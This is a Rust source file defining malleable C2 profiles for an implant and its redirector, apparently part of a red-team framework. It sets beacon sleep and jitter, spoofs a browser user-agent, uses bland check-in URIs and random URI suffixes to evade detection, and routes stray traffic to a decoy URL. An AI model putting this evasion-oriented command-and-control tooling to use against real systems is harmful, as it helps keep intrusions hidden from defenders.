use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;

/// A malleable C2 profile. Controls how the implant communicates and how the
/// redirector validates and routes traffic.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Profile {
    pub profile: ProfileMeta,
    pub transport: TransportConfig,
    #[serde(default)]
    pub http: HttpConfig,
    #[serde(default)]
    pub server: ServerConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfileMeta {
    pub name: String,
    /// Base beacon interval in milliseconds.
    #[serde(default = "default_sleep_ms")]
    pub sleep_ms: u64,
    /// Jitter as a percentage of sleep_ms (0–100). Actual sleep varies by
    /// ±jitter_pct% so beacons don't arrive on a fixed cadence.
    #[serde(default = "default_jitter_pct")]
    pub jitter_pct: u64,
    #[serde(default)]
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TransportConfig {
    #[serde(default = "default_protocol")]
    pub protocol: Protocol,
    /// Hostname or IP of the redirector.
    pub host: String,
    #[serde(default = "default_port_https")]
    pub port: u16,
    /// Accept invalid/self-signed TLS certs. Use only in lab environments.
    #[serde(default)]
    pub accept_invalid_certs: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Protocol {
    Http,
    Https,
}

/// HTTP-layer profile settings: URIs, headers, and user-agent the implant uses.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpConfig {
    /// URI the implant POSTs to for check-ins (receives tasks in response).
    #[serde(default = "default_checkin_uri")]
    pub checkin_uri: String,
    /// URI the implant POSTs task results to.
    #[serde(default = "default_result_uri")]
    pub result_uri: String,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    /// Extra HTTP headers sent with every request (e.g. Accept, Cache-Control).
    #[serde(default)]
    pub headers: HashMap<String, String>,
    /// Append a random URL suffix to each request to defeat URI-based caching/detection.
    #[serde(default)]
    pub uri_append_random: bool,
}

impl Default for HttpConfig {
    fn default() -> Self {
        Self {
            checkin_uri: default_checkin_uri(),
            result_uri: default_result_uri(),
            user_agent: default_user_agent(),
            headers: HashMap::new(),
            uri_append_random: false,
        }
    }
}

/// Server-side settings used by the redirector (not embedded in the implant).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ServerConfig {
    /// Shared secret between redirector and C2 server. The redirector adds this
    /// as `X-Wraith-Redirector-Token` when proxying; the server rejects requests
    /// that don't carry it.
    #[serde(default)]
    pub redirector_token: String,
    /// URI on the C2 server that receives forwarded check-ins.
    #[serde(default = "default_internal_checkin_uri")]
    pub internal_checkin_uri: String,
    /// URI on the C2 server that receives forwarded results.
    #[serde(default = "default_internal_result_uri")]
    pub internal_result_uri: String,
    /// If set, non-matching requests are proxied here instead of returning 404.
    #[serde(default)]
    pub decoy_url: Option<String>,
}

impl C2Profile {
    pub fn from_toml(content: &str) -> Result<Self> {
        toml::from_str(content).context("invalid C2 profile TOML")
    }

    pub fn from_file(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("failed reading profile {}", path.display()))?;
        Self::from_toml(&content)
    }

    /// Load all *.toml profiles from a directory.
    pub fn load_directory(dir: &Path) -> Result<Vec<Self>> {
        let mut profiles = Vec::new();
        let entries = std::fs::read_dir(dir)
            .with_context(|| format!("failed reading profiles directory {}", dir.display()))?;
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                match Self::from_file(&path) {
                    Ok(p) => profiles.push(p),
                    Err(err) => tracing_warn(&format!(
                        "skipping invalid profile {}: {err}",
                        path.display()
                    )),
                }
            }
        }
        Ok(profiles)
    }

    pub fn base_url(&self) -> String {
        format!(
            "{}://{}:{}",
            self.transport.protocol.scheme(),
            self.transport.host,
            self.transport.port,
        )
    }

    /// Full checkin URL (base + path).
    pub fn checkin_url(&self) -> String {
        format!("{}{}", self.base_url(), self.http.checkin_uri)
    }

    /// Full result URL (base + path).
    pub fn result_url(&self) -> String {
        format!("{}{}", self.base_url(), self.http.result_uri)
    }
}

impl Protocol {
    pub fn scheme(&self) -> &'static str {
        match self {
            Self::Http => "http",
            Self::Https => "https",
        }
    }
}

fn tracing_warn(msg: &str) {
    eprintln!("WARN: {msg}");
}

fn default_sleep_ms() -> u64 {
    5_000
}
fn default_jitter_pct() -> u64 {
    20
}
fn default_protocol() -> Protocol {
    Protocol::Https
}
fn default_port_https() -> u16 {
    443
}
fn default_checkin_uri() -> String {
    "/api/v1/update".to_owned()
}
fn default_result_uri() -> String {
    "/api/v1/result".to_owned()
}
fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36".to_owned()
}
fn default_internal_checkin_uri() -> String {
    "/implant/checkin".to_owned()
}
fn default_internal_result_uri() -> String {
    "/implant/result".to_owned()
}
